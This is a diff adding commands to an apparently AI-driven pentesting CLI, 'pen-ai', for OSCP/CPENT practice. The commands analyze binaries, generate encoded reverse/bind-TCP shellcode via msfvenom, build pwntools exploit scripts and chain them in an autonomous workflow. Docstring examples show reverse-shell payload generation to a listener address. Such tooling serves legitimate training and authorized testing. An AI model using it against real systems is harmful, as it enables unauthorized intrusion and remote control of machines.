@@ -307,5 +307,358 @@ def chains():
     print("    pen-ai fingerprint <target> <port> <service>")
 
 
+@app.command()
+def analyze(
+    binary: str = typer.Argument(..., help="Path to binary file"),
+):
+    """Analyze binary for vulnerabilities (OSCP/CPENT).
+
+    Checks protections, finds dangerous functions, suggests exploit techniques.
+
+    Examples:
+        pen-ai analyze /tmp/vuln
+        pen-ai analyze ./bof_binary
+    """
+    from ai.autonomous_executor import AutonomousExecutor
+    from exploitation.binary_analysis import BinaryAnalyzer
+
+    async def run_analyze():
+        executor = AutonomousExecutor(timeout=60)
+        analyzer = BinaryAnalyzer(executor)
+
+        print(f"\n🔍 Analyzing {binary}...")
+        info = await analyzer.analyze_binary(binary)
+        analyzer.print_analysis(info)
+
+        suggestions = analyzer.get_exploitation_suggestions(info)
+        if suggestions:
+            print(f"\n  EXPLOITATION SUGGESTIONS:")
+            for s in suggestions:
+                print(f"    [{s['difficulty'].upper()}] {s['technique']}: {s['reason']}")
+
+    asyncio.run(run_analyze())
+
+
+@app.command()
+def shellcode(
+    payload: str = typer.Option("reverse_tcp", help="Payload type: reverse_tcp, bind_tcp, exec"),
+    lhost: str = typer.Option("127.0.0.1", help="Listener host"),
+    lport: int = typer.Option(4444, help="Listener port"),
+    arch: str = typer.Option("x64", help="Architecture: x86, x64"),
+    encoder: str = typer.Option("", help="Encoder: x86/shikata_ga_nai"),
+    bad_chars: str = typer.Option("\\x00\\x0a\\x0d", help="Bad characters to avoid"),
+):
+    """Generate shellcode (OSCP/CPENT).
+
+    Uses msfvenom to generate encoded shellcode.
+
+    Examples:
+        pen-ai shellcode --payload reverse_tcp --lhost 10.10.14.5 --lport 4444
+        pen-ai shellcode --payload bind_tcp --lport 4444 --arch x86
+        pen-ai shellcode --encoder x86/shikata_ga_nai
+    """
+    from ai.autonomous_executor import AutonomousExecutor
+    from exploitation.shellcode_gen import ShellcodeGenerator
+
+    async def run_shellcode():
+        executor = AutonomousExecutor(timeout=60)
+        gen = ShellcodeGenerator(executor)
+
+        print(f"\n🔧 Generating shellcode...")
+        print(f"  Payload:  {payload}")
+        print(f"  LHOST:    {lhost}")
+        print(f"  LPORT:    {lport}")
+        print(f"  Arch:     {arch}")
+        if encoder:
+            print(f"  Encoder:  {encoder}")
+        print(f"  Bad chars: {bad_chars}")
+
+        sc = await gen.generate(
+            payload_type=payload,
+            lhost=lhost,
+            lport=lport,
+            arch=arch,
+            encoder=encoder,
+            bad_chars=bad_chars,
+        )
+
+        gen.print_shellcode(sc)
+
+        # Save to file
+        if sc.payload:
+            filename = gen.save_shellcode(sc)
+            print(f"\n  Saved to: {filename}")
+
+    asyncio.run(run_shellcode())
+
+
+@app.command()
+def exploit(
+    binary: str = typer.Argument(..., help="Path to vulnerable binary"),
+    technique: str = typer.Option("auto", help="Technique: auto, bof, ret2libc, rop, fmtstr"),
+    offset: int = typer.Option(0, help="Buffer overflow offset (0 = auto-find)"),
+    arch: str = typer.Option("x64", help="Architecture: x86, x64"),
+):
+    """Generate exploit script (OSCP/CPENT).
+
+    Analyzes binary and generates pwntools exploit script.
+
+    Examples:
+        pen-ai exploit ./vuln_binary
+        pen-ai exploit ./bof --technique bof --offset 72
+        pen-ai exploit ./vuln --technique ret2libc
+    """
+    from ai.autonomous_executor import AutonomousExecutor
+    from exploitation.binary_analysis import BinaryAnalyzer
+    from exploitation.exploit_dev import ExploitFramework
+
+    async def run_exploit():
+        executor = AutonomousExecutor(timeout=60)
+        analyzer = BinaryAnalyzer(executor)
+        framework = ExploitFramework(executor)
+
+        print(f"\n🔧 Generating exploit for {binary}...")
+
+        # Analyze binary first
+        info = await analyzer.analyze_binary(binary)
+
+        # Auto-detect technique
+        if technique == "auto":
+            suggestions = analyzer.get_exploitation_suggestions(info)
+            if suggestions:
+                detected = suggestions[0]['technique'].lower()
+                print(f"  Detected technique: {detected}")
+                if 'bof' in detected or 'buffer' in detected:
+                    detected_tech = "bof"
+                elif 'ret2libc' in detected:
+                    detected_tech = "ret2libc"
+                elif 'rop' in detected:
+                    detected_tech = "rop"
+                elif 'format' in detected:
+                    detected_tech = "fmtstr"
+                else:
+                    detected_tech = "bof"
+            else:
+                detected_tech = "bof"
+        else:
+            detected_tech = technique
+
+        # Auto-find offset if not provided
+        if offset == 0 and detected_tech in ['bof', 'rop']:
+            print("  Auto-detecting buffer overflow offset...")
+            bof_info = await analyzer.find_buffer_overflow(binary)
+            if bof_info.get('overflow_offset'):
+                detected_offset = bof_info['overflow_offset']
+                print(f"  Detected offset: {detected_offset}")
+            else:
+                detected_offset = 72  # Common default
+                print(f"  Using default offset: {detected_offset}")
+        else:
+            detected_offset = offset
+
+        # Generate exploit
+        if detected_tech == "bof":
+            exploit_result = await framework.generate_bof_exploit(binary, detected_offset, arch=arch)
+        elif detected_tech == "ret2libc":
+            exploit_result = await framework.generate_ret2libc(binary, detected_offset, arch=arch)
+        elif detected_tech == "rop":
+            exploit_result = await framework.generate_rop_chain(binary, detected_offset, arch=arch)
+        elif detected_tech == "fmtstr":
+            exploit_result = await framework.generate_format_string(binary)
+        else:
+            exploit_result = await framework.generate_bof_exploit(binary, detected_offset, arch=arch)
+
+        framework.print_exploit(exploit_result)
+
+        # Save exploit
+        filename = framework.save_exploit(exploit_result)
+        print(f"\n  Exploit saved to: {filename}")
+        print(f"  Run with: python3 {filename}")
+
+    asyncio.run(run_exploit())
+
+
+@app.command()
+def gdb(
+    binary: str = typer.Argument(..., help="Path to binary file"),
+    offset: int = typer.Option(0, help="Buffer overflow offset"),
+):
+    """Debug binary with GDB (OSCP/CPENT).
+
+    Generates GDB scripts for exploit development.
+
+    Examples:
+        pen-ai gdb ./vuln_binary
+        pen-ai gdb ./bof --offset 72
+    """
+    from ai.autonomous_executor import AutonomousExecutor
+    from exploitation.gdb_helper import GDBHelper
+
+    async def run_gdb():
+        executor = AutonomousExecutor(timeout=30)
+        helper = GDBHelper(executor)
+
+        print(f"\n🔧 Generating GDB script for {binary}...")
+
+        # Generate GDB script
+        if offset > 0:
+            script = helper.generate_overflow_debug_script(binary, offset)
+            print(f"  Buffer overflow offset: {offset}")
+        else:
+            script = helper.generate_buffer_overflow_script(binary)
+
+        # Save script
+        script_file = f"/tmp/gdb_{binary.replace('/', '_')}.py"
+        with open(script_file, "w") as f:
+            f.write(script)
+
+        print(f"  GDB script saved to: {script_file}")
+        print(f"  Run with: gdb -q -x {script_file} {binary}")
+
+        # Also create pattern file if offset provided
+        if offset > 0:
+            pattern = helper.create_pattern(offset + 100)
+            pattern_file = f"/tmp/pattern_{offset + 100}"
+            with open(pattern_file, "w") as f:
+                f.write(pattern)
+            print(f"  Pattern file: {pattern_file}")
+
+    asyncio.run(run_gdb())
+
+
+@app.command()
+def reverse(
+    binary: str = typer.Argument(..., help="Path to binary file"),
+):
+    """Reverse engineer binary with radare2 (OSCP/CPENT).
+
+    Analyzes functions, imports, strings, and vulnerabilities.
+
+    Examples:
+        pen-ai reverse ./vuln_binary
+        pen-ai reverse /usr/bin/ls
+    """
+    from ai.autonomous_executor import AutonomousExecutor
+    from exploitation.reverse_eng import ReverseEngineer
+
+    async def run_reverse():
+        executor = AutonomousExecutor(timeout=60)
+        re_eng = ReverseEngineer(executor)
+
+        print(f"\n🔍 Reverse engineering {binary}...")
+        result = await re_eng.analyze_r2(binary)
+        re_eng.print_analysis(result)
+
+        # Also check for buffer overflow
+        bof_info = await re_eng.find_buffer_overflow_pattern(binary)
+        if bof_info.get('vulnerable'):
+            print(f"\n  ⚠️  BUFFER OVERFLOW DETECTED!")
+            if bof_info.get('buffer_size'):
+                print(f"  Buffer size: {bof_info['buffer_size']} bytes")
+            if bof_info.get('overflow_offset'):
+                print(f"  Overflow offset: {bof_info['overflow_offset']} bytes")
+            if bof_info.get('dangerous_calls'):
+                print(f"  Dangerous calls: {', '.join(bof_info['dangerous_calls'])}")
+
+    asyncio.run(run_reverse())
+
+
+@app.command()
+def oscp(
+    target: str = typer.Argument(None, help="Target IP (for network targets)")
+):
+    """OSCP/CPENT mode - full pentest workflow.
+
+    Combines scanning, enumeration, exploitation, and reporting.
+
+    Examples:
+        pen-ai oscp 10.10.10.1
+        pen-ai oscp ./vuln_binary
+    """
+    from ai.autonomous_executor import AutonomousExecutor
+    from exploitation.binary_analysis import BinaryAnalyzer
+    from exploitation.exploit_dev import ExploitFramework
+    from exploitation.shellcode_gen import ShellcodeGenerator
+    from exploitation.gdb_helper import GDBHelper
+
+    async def run_oscp():
+        executor = AutonomousExecutor(timeout=60)
+        analyzer = BinaryAnalyzer(executor)
+        framework = ExploitFramework(executor)
+        shellcode_gen = ShellcodeGenerator(executor)
+        gdb_helper = GDBHelper(executor)
+
+        print(f"\n{'='*60}")
+        print(f"  🎯 PEN-AI OSCP/CPENT MODE")
+        print(f"{'='*60}\n")
+
+        if not target:
+            print("  No target specified. Use: pen-ai oscp <target>")
+            return
+
+        # Check if target is a file or network
+        import os
+        if os.path.isfile(target):
+            # Binary analysis workflow
+            print(f"  Binary Analysis Mode: {target}")
+            print(f"  {'─'*50}")
+
+            # Step 1: Analyze
+            print("\n  [1/4] Analyzing binary...")
+            info = await analyzer.analyze_binary(target)
+            analyzer.print_analysis(info)
+
+            # Step 2: Find vulnerabilities
+            print("\n  [2/4] Finding vulnerabilities...")
+            suggestions = analyzer.get_exploitation_suggestions(info)
+            if suggestions:
+                print(f"  Found {len(suggestions)} exploitation techniques:")
+                for s in suggestions:
+                    print(f"    [{s['difficulty'].upper()}] {s['technique']}")
+
+            # Step 3: Generate exploit
+            print("\n  [3/4] Generating exploit...")
+            if info.vulnerabilities:
+                # Auto-generate based on vulnerabilities
+                vuln_types = [v.get('type', '') for v in info.vulnerabilities]
+                if any('buffer_overflow' in v for v in vuln_types):
+                    bof_info = await analyzer.find_buffer_overflow(target)
+                    offset = bof_info.get('overflow_offset', 72)
+                    exploit = await framework.generate_bof_exploit(target, offset)
+                elif any('format_string' in v for v in vuln_types):
+                    exploit = await framework.generate_format_string(target)
+                elif any('command_injection' in v for v in vuln_types):
+                    print("  Command injection detected - try manual exploitation")
+                    exploit = None
+                else:
+                    exploit = await framework.generate_bof_exploit(target, 72)
+
+                if exploit:
+                    framework.print_exploit(exploit)
+                    filename = framework.save_exploit(exploit)
+                    print(f"  Exploit saved: {filename}")
+
+            # Step 4: Generate GDB script
+            print("\n  [4/4] Generating GDB debug script...")
+            gdb_script = gdb_helper.generate_buffer_overflow_script(target)
+            gdb_file = f"/tmp/gdb_{os.path.basename(target)}.py"
+            with open(gdb_file, "w") as f:
+                f.write(gdb_script)
+            print(f"  GDB script: {gdb_file}")
+
+        else:
+            # Network target workflow
+            print(f"  Network Target Mode: {target}")
+            print(f"  {'─'*50}")
+            print("\n  Use 'pen-ai freewill {target}' for full autonomous mode")
+            print(f"  Or 'pen-ai <target>' for interactive mode")
+
+        print(f"\n{'='*60}")
+        print(f"  📋 OSCP/CPENT WORKFLOW COMPLETE")
+        print(f"{'='*60}")
+
+    asyncio.run(run_oscp())
+
+
 if __name__ == "__main__":
     app()
